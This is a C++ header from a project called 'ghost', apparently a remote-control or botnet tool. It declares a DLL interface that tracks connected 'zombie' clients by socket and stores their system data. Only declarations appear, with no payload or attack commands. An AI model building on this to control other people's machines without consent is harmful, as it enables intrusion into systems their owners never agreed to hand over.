/*
	@title
		ghost
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	ghost is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	ghost is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================

#pragma once

#include	<vector>
#include	<Windows.h>
#include	"json.hpp"

#ifdef GHOSTLIBRARY_EXPORTS  
#define GHOSTLIBRARY_API __declspec(dllexport)   
#else  
#define GHOSTLIBRARY_API __declspec(dllimport)   
#endif  

using json = nlohmann::json;

#define GHOSTLIB ghostlib::_clientData

namespace ghostlib {
	struct _clientData {
		SOCKET socketRef;
		struct addrinfo * clientInfo;
		char * system_data;
	};

	GHOSTLIBRARY_API void addZombie(GHOSTLIB data);
	GHOSTLIBRARY_API _clientData & getZombieData( int idx );
	GHOSTLIBRARY_API int getZombieCount();
	GHOSTLIBRARY_API int getZombieIndex(SOCKET socketRef);
	GHOSTLIBRARY_API void parseZombie(SOCKET clientSocket, int zombieID, char * data);
	GHOSTLIBRARY_API void updateZombieConnection(int idx, SOCKET sockref);
	GHOSTLIBRARY_API void deleteZombie(int idx);
}
